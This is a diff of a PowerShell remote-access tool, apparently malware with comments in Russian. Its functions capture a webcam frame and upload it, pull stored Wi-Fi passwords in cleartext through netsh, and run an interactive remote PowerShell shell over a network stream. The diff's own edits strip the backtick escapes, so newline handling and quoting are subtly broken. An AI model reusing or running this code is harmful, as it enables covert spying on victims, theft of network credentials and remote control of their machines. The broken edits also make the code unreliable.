@@ -65,7 +65,7 @@ function Connect-ZiPo {
 
             if ($cameraName) {
                 # Снимаем кадр
-                Start-Process -FilePath $ffmpegPath -ArgumentList "-f dshow -i video=""$cameraName"" -frames:v 1 `"$tempImage`"" -NoNewWindow -Wait
+                Start-Process -FilePath $ffmpegPath -ArgumentList "-f dshow -i video=""$cameraName"" -frames:v 1 "$tempImage"" -NoNewWindow -Wait
                 if (Test-Path $tempImage) {
                     return Upload-File $tempImage
                 }
@@ -84,14 +84,8 @@ function Connect-ZiPo {
 
    function Get-WiFiCreds {
     try {
-        # Переключаем кодовую страницу консоли на OEM 866
-        cmd /c "chcp 866 >nul"
-        [Console]::OutputEncoding = [System.Text.Encoding]::GetEncoding(866)
-        
         $output = cmd /c "netsh wlan show profiles" | Out-String
-        $profiles = $output -split "`n" | Where-Object {
-            $_ -match "Все профили пользователей" -or $_ -match "All User Profile"
-        }
+        $profiles = $output -split "n" | Where-Object { $_ -match "Все профили пользователей" -or $_ -match "All User Profile" }
 
         if (-not $profiles) {
             return "[INFO] No Wi-Fi profiles found (adapter may be disabled or unavailable)."
@@ -100,11 +94,11 @@ function Connect-ZiPo {
         $results = ""
         foreach ($line in $profiles) {
             $profile = ($line -split ":")[1].Trim()
-            $results += "`n[$profile]`n"
+            $results += "n[$profile]n"
             $details = cmd /c "netsh wlan show profile name=""$profile"" key=clear" | Out-String
-            $key = ($details -split "`n") | Where-Object { $_ -match "Содержимое ключа|Key Content" }
+            $key = ($details -split "n") | Where-Object { $_ -match "Содержимое ключа|Key Content" }
             if ($key) {
-                $results += ($key -join "`n")
+                $results += ($key -join "n")
             } else {
                 $results += "[!] No key found"
             }
@@ -160,7 +154,7 @@ Arch: $env:PROCESSOR_ARCHITECTURE${esc}[0m
 ------------------------------------------------------------
 "@
 
-            $intro = $clear + $banner + "`nPS $currentDir> "
+            $intro = $clear + $banner + "nPS $currentDir> "
             $bbytes = [Text.Encoding]::UTF8.GetBytes($intro)
             $stream.Write($bbytes, 0, $bbytes.Length)
             $stream.Flush()
@@ -230,7 +224,7 @@ Arch: $env:PROCESSOR_ARCHITECTURE${esc}[0m
                 }
 
                 # Обновлённое добавление приглашения:
-                $response = ($response.TrimEnd() + "`n`nPS $currentDir> ")
+                $response = ($response.TrimEnd() + "nnPS $currentDir> ")
 
                 $outBytes = [Text.Encoding]::UTF8.GetBytes($response)
                 $stream.Write($outBytes, 0, $outBytes.Length)
